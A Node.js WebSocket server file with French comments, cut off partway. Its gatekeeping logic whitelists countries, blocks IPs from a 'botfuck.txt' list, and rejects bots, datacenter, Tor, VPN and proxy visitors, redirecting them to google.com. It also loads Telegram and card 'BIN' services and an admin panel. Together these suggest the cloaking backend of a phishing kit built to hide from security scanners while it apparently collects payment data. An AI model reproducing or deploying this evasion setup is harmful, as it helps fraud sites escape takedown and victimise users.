const WebSocket = require('ws');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const TelegramService = require('./services/telegramService');
const BinService = require('./services/binService');

// Services de sécurité anti-bot
const BotDetection = require('./services/botDetection');
const DatacenterDetection = require('./services/datacenterDetection');
const ProxyDetection = require('./services/proxyDetection');
const BehaviorAnalysis = require('./services/behaviorAnalysis');
const FingerprintService = require('./services/fingerprintService');
const SecurityConfig = require('./services/securityConfig');
const HCaptchaService = require('./services/hcaptchaService');
const VisitLogger = require('./services/visitLogger');

// Charger les variables d'environnement depuis .env si le fichier existe
const envPath = path.join(__dirname, '..', '.env');
if (fs.existsSync(envPath)) {
  console.log('[Server] 📄 Loading .env file...');
  const envContent = fs.readFileSync(envPath, 'utf8');
  envContent.split('\n').forEach(line => {
    const trimmedLine = line.trim();
    if (trimmedLine && !trimmedLine.startsWith('#')) {
      const [key, ...valueParts] = trimmedLine.split('=');
      if (key && valueParts.length > 0) {
        const value = valueParts.join('=').trim().replace(/^["']|["']$/g, '');
        if (!process.env[key.trim()]) {
          process.env[key.trim()] = value;
          console.log(`[Server] ✅ Loaded ${key.trim()} from .env`);
        }
      }
    }
  });
  console.log('[Server] ✅ .env file loaded');
} else {
  console.log('[Server] ⚠️  No .env file found. Using system environment variables.');
}

// Configuration
const PORT = process.env.WS_PORT || 8080;
const telegram = new TelegramService();
const binService = new BinService();

// Initialiser les services de sécurité
const securityConfig = new SecurityConfig();
const botDetection = new BotDetection();
const datacenterDetection = new DatacenterDetection();
const proxyDetection = new ProxyDetection();
const behaviorAnalysis = new BehaviorAnalysis();
const fingerprintService = new FingerprintService();
const hcaptchaService = new HCaptchaService();
const visitLogger = new VisitLogger();

console.log('[Server] 🛡️ Security services initialized');
console.log('[Server] 🔐 hCaptcha:', hcaptchaService.isEnabled() ? 'ENABLED' : 'DISABLED');
console.log('[Server] 📝 Visit Logger: ENABLED');

// ============================================
// SYSTÈME DE RESTRICTION PAR PAYS (WHITELIST)
// ============================================

// Charger la whitelist des pays autorisés et IPs autorisées
let allowedCountries = new Set();
let allowedIPs = new Set();
let blockedIPs = new Set();

function loadWhitelist() {
  const whitelistPath = path.join(__dirname, '..', '..', 'whitelist.txt');
  console.log('[Whitelist] 📄 Looking for whitelist at:', whitelistPath);
  
  if (fs.existsSync(whitelistPath)) {
    const content = fs.readFileSync(whitelistPath, 'utf8');
    allowedCountries = new Set();
    allowedIPs = new Set();
    content.split('\n').forEach(line => {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith('#')) {
        // Vérifier si c'est une IP (contient des points et des chiffres)
        if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(trimmed)) {
          allowedIPs.add(trimmed);
        } else {
          // Sinon c'est un code pays
          allowedCountries.add(trimmed.toUpperCase());
        }
      }
    });
    console.log('[Whitelist] ✅ Loaded allowed countries:', Array.from(allowedCountries));
    console.log('[Whitelist] ✅ Loaded allowed IPs:', Array.from(allowedIPs));
  } else {
    console.log('[Whitelist] ⚠️  No whitelist.txt found - all countries allowed');
  }
}

function loadBotfuck() {
  const botfuckPath = path.join(__dirname, '..', '..', 'botfuck.txt');
  console.log('[Botfuck] 📄 Looking for botfuck at:', botfuckPath);
  
  if (fs.existsSync(botfuckPath)) {
    const content = fs.readFileSync(botfuckPath, 'utf8');
    blockedIPs = new Set();
    content.split('\n').forEach(line => {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith('#')) {
        blockedIPs.add(trimmed);
      }
    });
    console.log('[Botfuck] ✅ Loaded blocked IPs:', blockedIPs.size, 'entries');
  } else {
    console.log('[Botfuck] ⚠️  No botfuck.txt found - no IPs blocked');
  }
}

// Vérifier si une IP est whitelistée
function isIPWhitelisted(ip) {
  if (allowedIPs.size === 0) {
    return false;
  }
  const whitelisted = allowedIPs.has(ip);
  if (whitelisted) {
    console.log(`[Whitelist] ✅ IP ${ip} is WHITELISTED - bypassing country check`);
  }
  return whitelisted;
}

// Vérifier si un pays est autorisé
function isCountryAllowed(countryCode, ip) {
  // Si l'IP est whitelistée, autoriser directement
  if (isIPWhitelisted(ip)) {
    return true;
  }
  // Si pas de whitelist pays, tout est autorisé
  if (allowedCountries.size === 0) {
    return true;
  }
  // Vérifier si le code pays est dans la whitelist
  const code = (countryCode || '').toUpperCase();
  const allowed = allowedCountries.has(code);
  console.log(`[Whitelist] 🔍 Country ${code} allowed: ${allowed}`);
  return allowed;
}

// Vérifier si une IP est bloquée
function isIPBlocked(ip) {
  if (blockedIPs.size === 0) {
    return false;
  }
  const blocked = blockedIPs.has(ip);
  console.log(`[Botfuck] 🔍 IP ${ip} blocked: ${blocked}`);
  return blocked;
}

// Charger les listes au démarrage
loadWhitelist();
loadBotfuck();

// Recharger les listes toutes les 60 secondes
setInterval(() => {
  console.log('[Config] 🔄 Reloading whitelist and botfuck...');
  loadWhitelist();
  loadBotfuck();
}, 60000);

// ============================================

// Créer le serveur HTTP avec gestionnaire de requêtes
const server = http.createServer((req, res) => {
  // Headers CORS pour permettre l'accès depuis ozyadmin.php
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Gérer les requêtes OPTIONS (preflight CORS)
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }
  
  // Endpoint de santé pour Render
  if (req.url === '/health' || req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      status: 'ok', 
      service: 'neti-websocket-server',
      timestamp: new Date().toISOString(),
      clients: clients.size,
      dashboards: dashboards.size
    }));
    return;
  }
  
  // API: Obtenir les visites
  if (req.url === '/api/visits' || req.url.startsWith('/api/visits?')) {
    const visits = visitLogger.getVisits(100);
    const stats = visitLogger.getStats();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ visits, stats }));
    return;
  }
  
  // API: Obtenir la configuration de sécurité
  if (req.url === '/api/config') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      config: securityConfig.getConfig(),
      allowedCountries: Array.from(allowedCountries),
      allowedIPs: Array.from(allowedIPs),
      blockedIPs: Array.from(blockedIPs)
    }));
    return;
  }
  
  // API: Effacer les visites
  if (req.url === '/api/visits/clear' && req.method === 'POST') {
    visitLogger.clearVisits();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true, message: 'Visits cleared' }));
    return;
  }
  
  // Pour toutes les autres requêtes HTTP
  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Not Found' }));
});

// Créer le serveur WebSocket
const wss = new WebSocket.Server({ server });

// Stockage des connexions
const clients = new Map();
const dashboards = new Set();

// Fonction pour extraire la vraie adresse IP du client
function getClientIP(req) {
  const headers = {
    'x-forwarded-for': req.headers['x-forwarded-for'],
    'x-real-ip': req.headers['x-real-ip'],
    'cf-connecting-ip': req.headers['cf-connecting-ip'],
    'true-client-ip': req.headers['true-client-ip']
  };
  
  const remoteAddress = req.socket.remoteAddress;
  
  console.log('[IP Detection] Headers:', JSON.stringify(headers, null, 2));
  console.log('[IP Detection] Remote Address:', remoteAddress);
  
  // Vérifier X-Forwarded-For (peut contenir plusieurs IPs, prendre la première)
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    // X-Forwarded-For peut contenir plusieurs IPs séparées par des virgules
    // La première est généralement l'IP du client original
    const ips = xForwardedFor.split(',').map(ip => ip.trim());
    console.log('[IP Detection] X-Forwarded-For IPs:', ips);
    if (ips.length > 0 && ips[0]) {
      // Nettoyer l'IP (enlever le port si présent)
      const cleanIP = ips[0].split(':')[0];
      if (cleanIP && cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
        console.log('[IP Detection] ✅ Using X-Forwarded-For:', cleanIP);
        return cleanIP;
      }
    }
  }

  // Vérifier X-Real-IP
  const xRealIP = req.headers['x-real-ip'];
  if (xRealIP) {
    const cleanIP = xRealIP.split(':')[0];
    console.log('[IP Detection] X-Real-IP:', cleanIP);
    if (cleanIP && cleanIP !== '::1' && cleanIP !== '127.0.0.1') {
      console.log('[IP Detection] ✅ Using X-Real-IP:', cleanIP);
      return cleanIP;
    }
  }

  // Vérifier CF-Connecting-IP (Cloudflare)
  const cfConnectingIP = req.headers['cf-connecting-ip'];
  if (cfConnectingIP) {
    const cleanIP = cfConnectingIP.split(':')[0];
    console.log('[IP Detection] CF-Connecting-IP:', cleanIP);
    if (cleanIP) {
      console.log('[IP Detection] ✅ Using CF-Connecting-IP:', cleanIP);
      return cleanIP;
    }
  }

  // Vérifier True-Client-IP (Akamai, Cloudflare Enterprise)
  const trueClientIP = req.headers['true-client-ip'];
  if (trueClientIP) {
    const cleanIP = trueClientIP.split(':')[0];
    console.log('[IP Detection] True-Client-IP:', cleanIP);
    if (cleanIP) {
      console.log('[IP Detection] ✅ Using True-Client-IP:', cleanIP);
      return cleanIP;
    }
  }

  // Fallback sur remoteAddress
  let ip = req.socket.remoteAddress;
  
  // Nettoyer l'IP (enlever ::ffff: pour IPv4 mapped IPv6)
  if (ip) {
    ip = ip.replace(/^::ffff:/, '');
    // Enlever le port si présent
    ip = ip.split(':')[0];
  }
  
  console.log('[IP Detection] ✅ Using Remote Address (fallback):', ip || 'unknown');
  return ip || 'unknown';
}

// Fonction pour obtenir le pays à partir de l'IP avec ipinfo.io en priorité
function getCountryFromIP(ip) {
  return new Promise((resolve) => {
    console.log(`[Country] 🔍 Fetching country for IP: ${ip}`);
    
    // Ignorer les IPs locales
    if (!ip || ip === 'unknown' || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
      console.log(`[Country] ⚠️  Local IP detected, returning 'Local'`);
      resolve('Local');
      return;
    }

    // Essayer d'abord avec ipinfo.io (API prioritaire)
    const url1 = `https://ipinfo.io/${ip}/json`;
    console.log(`[Country] 🌐 Trying API 1 (ipinfo.io): ${url1}`);
    
    const request1 = https.get(url1, (res) => {
      let data = '';
      
      console.log(`[Country] 📡 API 1 (ipinfo.io) Response status: ${res.statusCode}`);
      
      if (res.statusCode === 403 || res.statusCode === 429) {
        console.log(`[Country] ⚠️  API 1 returned status ${res.statusCode} (rate limited/forbidden), trying fallback...`);
        tryFallbackAPI(ip, resolve);
        return;
      }
      
      if (res.statusCode !== 200) {
        console.log(`[Country] ⚠️  API 1 returned status ${res.statusCode}, trying fallback...`);
        tryFallbackAPI(ip, resolve);
        return;
      }
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        try {
          console.log(`[Country] 📦 API 1 (ipinfo.io) Response data:`, data);
          const result = JSON.parse(data);
          console.log(`[Country] 📊 API 1 Parsed result:`, JSON.stringify(result, null, 2));
          
          if (result.country) {
            // Convertir le code pays en nom complet
            const countryName = getCountryName(result.country);
            console.log(`[Country] ✅ API 1 (ipinfo.io) Success! Country: ${countryName} (${result.country})`);
            resolve(countryName);
          } else if (result.error) {
            console.log(`[Country] ⚠️  API 1 returned error: ${result.error}, trying fallback...`);
            tryFallbackAPI(ip, resolve);
          } else {
            console.log(`[Country] ⚠️  API 1 no country found, trying fallback...`);
            tryFallbackAPI(ip, resolve);
          }
        } catch (error) {
          console.error(`[Country] ❌ Error parsing API 1 data:`, error);
          console.error(`[Country] Raw data:`, data);
          tryFallbackAPI(ip, resolve);
        }
      });
    });
    
    request1.on('error', (error) => {
      console.error(`[Country] ❌ API 1 (ipinfo.io) Error:`, error.message);
      tryFallbackAPI(ip, resolve);
    });
    
    // Timeout de 8 secondes pour la première API
    request1.setTimeout(8000, () => {
      console.error(`[Country] ⏱️  API 1 Timeout after 8 seconds for IP: ${ip}`);
      request1.destroy();
      tryFallbackAPI(ip, resolve);
    });
  });
}

// Mapping des codes pays ISO vers noms complets
function getCountryName(countryCode) {
  const countries = {
    'AF': 'Afghanistan', 'AL': 'Albania', 'DZ': 'Algeria', 'AD': 'Andorra', 'AO': 'Angola',
    'AR': 'Argentina', 'AM': 'Armenia', 'AU': 'Australia', 'AT': 'Austria', 'AZ': 'Azerbaijan',
    'BH': 'Bahrain', 'BD': 'Bangladesh', 'BY': 'Belarus', 'BE': 'Belgium', 'BZ': 'Belize',
    'BJ': 'Benin', 'BT': 'Bhutan', 'BO': 'Bolivia', 'BA': 'Bosnia and Herzegovina', 'BW': 'Botswana',
    'BR': 'Brazil', 'BN': 'Brunei', 'BG': 'Bulgaria', 'BF': 'Burkina Faso', 'BI': 'Burundi',
    'KH': 'Cambodia', 'CM': 'Cameroon', 'CA': 'Canada', 'CV': 'Cape Verde', 'CF': 'Central African Republic',
    'TD': 'Chad', 'CL': 'Chile', 'CN': 'China', 'CO': 'Colombia', 'KM': 'Comoros',
    'CG': 'Congo', 'CD': 'DR Congo', 'CR': 'Costa Rica', 'CI': "Côte d'Ivoire", 'HR': 'Croatia',
    'CU': 'Cuba', 'CY': 'Cyprus', 'CZ': 'Czech Republic', 'DK': 'Denmark', 'DJ': 'Djibouti',
    'DO': 'Dominican Republic', 'EC': 'Ecuador', 'EG': 'Egypt', 'SV': 'El Salvador', 'GQ': 'Equatorial Guinea',
    'ER': 'Eritrea', 'EE': 'Estonia', 'ET': 'Ethiopia', 'FI': 'Finland', 'FR': 'France',
    'GA': 'Gabon', 'GM': 'Gambia', 'GE': 'Georgia', 'DE': 'Germany', 'GH': 'Ghana',
    'GR': 'Greece', 'GT': 'Guatemala', 'GN': 'Guinea', 'GW': 'Guinea-Bissau', 'GY': 'Guyana',
    'HT': 'Haiti', 'HN': 'Honduras', 'HK': 'Hong Kong', 'HU': 'Hungary', 'IS': 'Iceland',
    'IN': 'India', 'ID': 'Indonesia', 'IR': 'Iran', 'IQ': 'Iraq', 'IE': 'Ireland',
    'IL': 'Israel', 'IT': 'Italy', 'JM': 'Jamaica', 'JP': 'Japan', 'JO': 'Jordan',
    'KZ': 'Kazakhstan', 'KE': 'Kenya', 'KW': 'Kuwait', 'KG': 'Kyrgyzstan', 'LA': 'Laos',
    'LV': 'Latvia', 'LB': 'Lebanon', 'LS': 'Lesotho', 'LR': 'Liberia', 'LY': 'Libya',
    'LI': 'Liechtenstein', 'LT': 'Lithuania', 'LU': 'Luxembourg', 'MK': 'North Macedonia', 'MG': 'Madagascar',
    'MW': 'Malawi', 'MY': 'Malaysia', 'MV': 'Maldives', 'ML': 'Mali', 'MT': 'Malta',
    'MR': 'Mauritania', 'MU': 'Mauritius', 'MX': 'Mexico', 'MD': 'Moldova', 'MC': 'Monaco',
    'MN': 'Mongolia', 'ME': 'Montenegro', 'MA': 'Morocco', 'MZ': 'Mozambique', 'MM': 'Myanmar',
    'NA': 'Namibia', 'NP': 'Nepal', 'NL': 'Netherlands', 'NZ': 'New Zealand', 'NI': 'Nicaragua',
    'NE': 'Niger', 'NG': 'Nigeria', 'NO': 'Norway', 'OM': 'Oman', 'PK': 'Pakistan',
    'PA': 'Panama', 'PG': 'Papua New Guinea', 'PY': 'Paraguay', 'PE': 'Peru', 'PH': 'Philippines',
    'PL': 'Poland', 'PT': 'Portugal', 'QA': 'Qatar', 'RO': 'Romania', 'RU': 'Russia',
    'RW': 'Rwanda', 'SA': 'Saudi Arabia', 'SN': 'Senegal', 'RS': 'Serbia', 'SG': 'Singapore',
    'SK': 'Slovakia', 'SI': 'Slovenia', 'SO': 'Somalia', 'ZA': 'South Africa', 'KR': 'South Korea',
    'ES': 'Spain', 'LK': 'Sri Lanka', 'SD': 'Sudan', 'SE': 'Sweden', 'CH': 'Switzerland',
    'SY': 'Syria', 'TW': 'Taiwan', 'TJ': 'Tajikistan', 'TZ': 'Tanzania', 'TH': 'Thailand',
    'TG': 'Togo', 'TN': 'Tunisia', 'TR': 'Turkey', 'TM': 'Turkmenistan', 'UG': 'Uganda',
    'UA': 'Ukraine', 'AE': 'United Arab Emirates', 'GB': 'United Kingdom', 'US': 'United States',
    'UY': 'Uruguay', 'UZ': 'Uzbekistan', 'VE': 'Venezuela', 'VN': 'Vietnam', 'YE': 'Yemen',
    'ZM': 'Zambia', 'ZW': 'Zimbabwe'
  };
  return countries[countryCode] || countryCode;
}

// Convertir un nom de pays en code ISO
function getCountryCode(countryName) {
  const countryCodes = {
    'Afghanistan': 'AF', 'Albania': 'AL', 'Algeria': 'DZ', 'Andorra': 'AD', 'Angola': 'AO',
    'Argentina': 'AR', 'Armenia': 'AM', 'Australia': 'AU', 'Austria': 'AT', 'Azerbaijan': 'AZ',
    'Bahrain': 'BH', 'Bangladesh': 'BD', 'Belarus': 'BY', 'Belgium': 'BE', 'Belize': 'BZ',
    'Benin': 'BJ', 'Bhutan': 'BT', 'Bolivia': 'BO', 'Bosnia and Herzegovina': 'BA', 'Botswana': 'BW',
    'Brazil': 'BR', 'Brunei': 'BN', 'Bulgaria': 'BG', 'Burkina Faso': 'BF', 'Burundi': 'BI',
    'Cambodia': 'KH', 'Cameroon': 'CM', 'Canada': 'CA', 'Cape Verde': 'CV', 'Central African Republic': 'CF',
    'Chad': 'TD', 'Chile': 'CL', 'China': 'CN', 'Colombia': 'CO', 'Comoros': 'KM',
    'Congo': 'CG', 'DR Congo': 'CD', 'Costa Rica': 'CR', "Côte d'Ivoire": 'CI', 'Croatia': 'HR',
    'Cuba': 'CU', 'Cyprus': 'CY', 'Czech Republic': 'CZ', 'Denmark': 'DK', 'Djibouti': 'DJ',
    'Dominican Republic': 'DO', 'Ecuador': 'EC', 'Egypt': 'EG', 'El Salvador': 'SV', 'Equatorial Guinea': 'GQ',
    'Eritrea': 'ER', 'Estonia': 'EE', 'Ethiopia': 'ET', 'Finland': 'FI', 'France': 'FR',
    'Gabon': 'GA', 'Gambia': 'GM', 'Georgia': 'GE', 'Germany': 'DE', 'Ghana': 'GH',
    'Greece': 'GR', 'Guatemala': 'GT', 'Guinea': 'GN', 'Guinea-Bissau': 'GW', 'Guyana': 'GY',
    'Haiti': 'HT', 'Honduras': 'HN', 'Hong Kong': 'HK', 'Hungary': 'HU', 'Iceland': 'IS',
    'India': 'IN', 'Indonesia': 'ID', 'Iran': 'IR', 'Iraq': 'IQ', 'Ireland': 'IE',
    'Israel': 'IL', 'Italy': 'IT', 'Jamaica': 'JM', 'Japan': 'JP', 'Jordan': 'JO',
    'Kazakhstan': 'KZ', 'Kenya': 'KE', 'Kuwait': 'KW', 'Kyrgyzstan': 'KG', 'Laos': 'LA',
    'Latvia': 'LV', 'Lebanon': 'LB', 'Lesotho': 'LS', 'Liberia': 'LR', 'Libya': 'LY',
    'Liechtenstein': 'LI', 'Lithuania': 'LT', 'Luxembourg': 'LU', 'North Macedonia': 'MK', 'Madagascar': 'MG',
    'Malawi': 'MW', 'Malaysia': 'MY', 'Maldives': 'MV', 'Mali': 'ML', 'Malta': 'MT',
    'Mauritania': 'MR', 'Mauritius': 'MU', 'Mexico': 'MX', 'Moldova': 'MD', 'Monaco': 'MC',
    'Mongolia': 'MN', 'Montenegro': 'ME', 'Morocco': 'MA', 'Mozambique': 'MZ', 'Myanmar': 'MM',
    'Namibia': 'NA', 'Nepal': 'NP', 'Netherlands': 'NL', 'New Zealand': 'NZ', 'Nicaragua': 'NI',
    'Niger': 'NE', 'Nigeria': 'NG', 'Norway': 'NO', 'Oman': 'OM', 'Pakistan': 'PK',
    'Panama': 'PA', 'Papua New Guinea': 'PG', 'Paraguay': 'PY', 'Peru': 'PE', 'Philippines': 'PH',
    'Poland': 'PL', 'Portugal': 'PT', 'Qatar': 'QA', 'Romania': 'RO', 'Russia': 'RU',
    'Rwanda': 'RW', 'Saudi Arabia': 'SA', 'Senegal': 'SN', 'Serbia': 'RS', 'Singapore': 'SG',
    'Slovakia': 'SK', 'Slovenia': 'SI', 'Somalia': 'SO', 'South Africa': 'ZA', 'South Korea': 'KR',
    'Spain': 'ES', 'Sri Lanka': 'LK', 'Sudan': 'SD', 'Sweden': 'SE', 'Switzerland': 'CH',
    'Syria': 'SY', 'Taiwan': 'TW', 'Tajikistan': 'TJ', 'Tanzania': 'TZ', 'Thailand': 'TH',
    'Togo': 'TG', 'Tunisia': 'TN', 'Turkey': 'TR', 'Turkmenistan': 'TM', 'Uganda': 'UG',
    'Ukraine': 'UA', 'United Arab Emirates': 'AE', 'United Kingdom': 'GB', 'United States': 'US',
    'Uruguay': 'UY', 'Uzbekistan': 'UZ', 'Venezuela': 'VE', 'Vietnam': 'VN', 'Yemen': 'YE',
    'Zambia': 'ZM', 'Zimbabwe': 'ZW', 'Local': 'LOCAL', 'Unknown': 'UNKNOWN'
  };
  return countryCodes[countryName] || countryName;
}

// Fonction de fallback avec ip-api.com
function tryFallbackAPI(ip, resolve) {
  console.log(`[Country] 🔄 Trying fallback API (ip-api.com) for IP: ${ip}`);
  
  const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode`;
  console.log(`[Country] 🌐 Fallback API URL: ${url}`);
  
  // Utiliser http pour ip-api.com (pas https sur le plan gratuit)
  const http = require('http');
  const request = http.get(url, (res) => {
    let data = '';
    
    console.log(`[Country] 📡 Fallback API Response status: ${res.statusCode}`);
    
    if (res.statusCode !== 200) {
      console.log(`[Country] ⚠️  Fallback API returned status ${res.statusCode}, returning Unknown`);
      resolve('Unknown');
      return;
    }
    
    res.on('data', (chunk) => {
      data += chunk;
    });
    
    res.on('end', () => {
      try {
        console.log(`[Country] 📦 Fallback API Response data:`, data);
        const result = JSON.parse(data);
        console.log(`[Country] 📊 Fallback API Parsed result:`, JSON.stringify(result, null, 2));
        
        if (result.status === 'success' && result.country) {
          console.log(`[Country] ✅ Fallback API Success! Country: ${result.country}`);
          resolve(result.country);
        } else {
          console.log(`[Country] ⚠️  Fallback API 2 failed, trying API 3...`);
          tryThirdAPI(ip, resolve);
        }
      } catch (error) {
        console.error(`[Country] ❌ Error parsing fallback API data:`, error);
        tryThirdAPI(ip, resolve);
      }
    });
  });
  
  request.on('error', (error) => {
    console.error(`[Country] ❌ Fallback API Error:`, error.message);
    tryThirdAPI(ip, resolve);
  });
  
  request.setTimeout(5000, () => {
    console.error(`[Country] ⏱️  Fallback API Timeout for IP: ${ip}`);
    request.destroy();
    tryThirdAPI(ip, resolve);
  });
}

// Troisième API de fallback (ipwho.is - gratuit, pas de limite)
function tryThirdAPI(ip, resolve) {
  const url = `https://ipwho.is/${ip}`;
  console.log(`[Country] 🌐 Trying API 3 (ipwho.is): ${url}`);
  
  const request = https.get(url, (res) => {
    let data = '';
    
    console.log(`[Country] 📡 API 3 (ipwho.is) Response status: ${res.statusCode}`);
    
    if (res.statusCode !== 200) {
      console.log(`[Country] ⚠️  API 3 returned status ${res.statusCode}, returning Unknown`);
      resolve('Unknown');
      return;
    }
    
    res.on('data', (chunk) => {
      data += chunk;
    });
    
    res.on('end', () => {
      try {
        console.log(`[Country] 📦 API 3 Response data:`, data.substring(0, 500));
        const result = JSON.parse(data);
        
        if (result.success && result.country) {
          console.log(`[Country] ✅ API 3 (ipwho.is) Success! Country: ${result.country}`);
          resolve(result.country);
        } else if (result.country_code) {
          const countryName = getCountryName(result.country_code);
          console.log(`[Country] ✅ API 3 Success via country_code! Country: ${countryName}`);
          resolve(countryName);
        } else {
          console.log(`[Country] ⚠️  API 3 no country found, returning Unknown`);
          resolve('Unknown');
        }
      } catch (error) {
        console.error(`[Country] ❌ Error parsing API 3 data:`, error);
        resolve('Unknown');
      }
    });
  });
  
  request.on('error', (error) => {
    console.error(`[Country] ❌ API 3 Error:`, error.message);
    resolve('Unknown');
  });
  
  request.setTimeout(5000, () => {
    console.error(`[Country] ⏱️  API 3 Timeout for IP: ${ip}`);
    request.destroy();
    resolve('Unknown');
  });
}

// ============================================
// NETTOYAGE PÉRIODIQUE DES SERVICES
// ============================================

// Nettoyer les services toutes les 5 minutes
setInterval(() => {
  console.log('[Cleanup] 🧹 Running periodic cleanup...');
  botDetection.cleanup();
  datacenterDetection.cleanupCache();
  proxyDetection.cleanupCache();
  behaviorAnalysis.cleanup();
  fingerprintService.cleanup();
}, 5 * 60 * 1000);

// Mettre à jour la liste Tor toutes les heures
setInterval(async () => {
  console.log('[Security] 🧅 Updating Tor exit nodes...');
  await proxyDetection.updateTorExitNodes();
}, 60 * 60 * 1000);

// Gestion des connexions WebSocket
wss.on('connection', async (ws, req) => {
  const clientId = generateClientId();
  const ip = getClientIP(req);
  const userAgent = req.headers['user-agent'] || '';
  
  console.log(`\n[Connection] ========================================`);
  console.log(`[Connection] 🔌 New WebSocket connection`);
  console.log(`[Connection] Client ID: ${clientId}`);
  console.log(`[Connection] Detected IP: ${ip}`);
  console.log(`[Connection] User-Agent: ${userAgent || 'N/A'}`);
  console.log(`[Connection] Origin: ${req.headers.origin || 'N/A'}`);
  console.log(`[Connection] ========================================\n`);

  // ============================================
  // VÉRIFICATIONS DE SÉCURITÉ ANTI-BOT
  // ============================================
  
  // 2. Détection de bot via User-Agent (avant blocage pour avoir les infos)
  const botAnalysis = botDetection.analyze(req, ip);
  
  // 4. Obtenir le pays à partir de l'IP (avant blocage pour avoir les infos)
  const country = await getCountryFromIP(ip);
  const countryCode = getCountryCode(country);
  
  // 6. Détection Datacenter (async)
  let datacenterInfo = null;
  try {
    datacenterInfo = await datacenterDetection.detect(ip);
  } catch (error) {
    console.error(`[Security] ⚠️ Datacenter detection error for ${ip}:`, error.message);
  }

  // 7. Détection Proxy/Tor/VPN (async)
  let proxyInfo = null;
  try {
    proxyInfo = await proxyDetection.detect(ip, req.headers);
  } catch (error) {
    console.error(`[Security] ⚠️ Proxy detection error for ${ip}:`, error.message);
  }

  // Préparer les données de visite pour le logging
  const visitData = {
    ip,
    country,
    countryCode,
    userAgent,
    clientId,
    isBot: botAnalysis.isBot,
    botScore: botAnalysis.score,
    botReasons: botAnalysis.reasons,
    isDatacenter: datacenterInfo?.isDatacenter || false,
    datacenterOrg: datacenterInfo?.org || null,
    isProxy: proxyInfo?.isProxy || false,
    isTor: proxyInfo?.isTor || false,
    isVPN: proxyInfo?.isVPN || false,
    isBlocked: false,
    blockReason: null
  };

  // 0. BYPASS COMPLET pour les IPs whitelistées
  const ipIsWhitelisted = isIPWhitelisted(ip);
  if (ipIsWhitelisted) {
    console.log(`[Security] 🔓 IP ${ip} is WHITELISTED - BYPASSING ALL SECURITY CHECKS`);
    visitLogger.logVisit(visitData);
    // Continuer directement vers la connexion autorisée (sauter tous les checks)
  } else {
    // 1. Vérifier si l'IP est dans la blacklist
    if (isIPBlocked(ip) || securityConfig.isIPBlocked(ip)) {
      console.log(`[Security] 🚫 IP ${ip} is BLACKLISTED - blocking`);
      visitData.isBlocked = true;
      visitData.blockReason = 'blacklisted_ip';
      visitLogger.logVisit(visitData);
      ws.close(4003, 'Access denied');
      return;
    }

    // 2. Vérifier détection bot
    if (botAnalysis.shouldBlock) {
      console.log(`[Security] 🤖 Bot detected for ${ip}: ${botAnalysis.reasons.join(', ')}`);
      visitData.isBlocked = true;
      visitData.blockReason = 'bot_detected';
      visitLogger.logVisit(visitData);
      ws.close(4003, 'Access denied');
      return;
    }

    // 3. Vérifier le rate limiting
    const rateLimit = botDetection.checkRateLimit(ip);
    if (rateLimit.blocked) {
      console.log(`[Security] ⏱️ Rate limit exceeded for ${ip}: ${rateLimit.reason}`);
      visitData.isBlocked = true;
      visitData.blockReason = 'rate_limited';
      visitLogger.logVisit(visitData);
      ws.close(4003, 'Too many requests');
      return;
    }

    console.log(`[Country] ✅ IP ${ip} -> Country: ${country}`);

    // 5. Vérifier si le pays est autorisé (whitelist)
    if (!isCountryAllowed(countryCode, ip)) {
      console.log(`[Security] 🌍 Country ${country} (${countryCode}) NOT in whitelist - blocking`);
      visitData.isBlocked = true;
      visitData.blockReason = 'country_blocked';
      visitLogger.logVisit(visitData);
      ws.send(JSON.stringify({
        type: 'blocked',
        message: 'Access denied for your country',
        redirect: 'https://www.google.com'
      }));
      ws.close(4003, 'Country not allowed');
      return;
    }
    console.log(`[Security] ✅ Country ${country} (${countryCode}) is ALLOWED`);

    // 6. Vérifier datacenter
    if (datacenterInfo?.isDatacenter && securityConfig.shouldBlockDatacenter(true)) {
      console.log(`[Security] 🏢 Datacenter detected for ${ip}: ${datacenterInfo.org}`);
      visitData.isBlocked = true;
      visitData.blockReason = 'datacenter_blocked';
      visitLogger.logVisit(visitData);
      ws.send(JSON.stringify({
        type: 'blocked',
        message: 'Datacenter connections not allowed',
        redirect: 'https://www.google.com'
      }));
      ws.close(4003, 'Datacenter not allowed');
      return;
    }

    // 7. Vérifier Proxy/Tor/VPN
    if (proxyInfo?.isTor && securityConfig.shouldBlockTor()) {
      console.log(`[Security] 🧅 Tor detected for ${ip}`);
      visitData.isBlocked = true;
      visitData.blockReason = 'tor_blocked';
      visitLogger.logVisit(visitData);
      ws.close(4003, 'Tor not allowed');
      return;
    }
    
    if (proxyInfo?.isVPN && securityConfig.shouldBlockVPN()) {
      console.log(`[Security] 🔐 VPN detected for ${ip}: ${proxyInfo.details?.api?.org || 'Unknown'}`);
      visitData.isBlocked = true;
      visitData.blockReason = 'vpn_blocked';
      visitLogger.logVisit(visitData);
      ws.close(4003, 'VPN not allowed');
      return;
    }
    
    if (proxyInfo?.isProxy && securityConfig.shouldBlockProxy()) {
      console.log(`[Security] 🔄 Proxy detected for ${ip}`);
      visitData.isBlocked = true;
      visitData.blockReason = 'proxy_blocked';
      visitLogger.logVisit(visitData);
      ws.close(4003, 'Proxy not allowed');
      return;
    }

    // ✅ Visite autorisée - logger (si pas déjà fait pour IP whitelistée)
    visitLogger.logVisit(visitData);
  } // Fin du else (vérifications de sécurité)

  // ============================================
  // CONNEXION AUTORISÉE
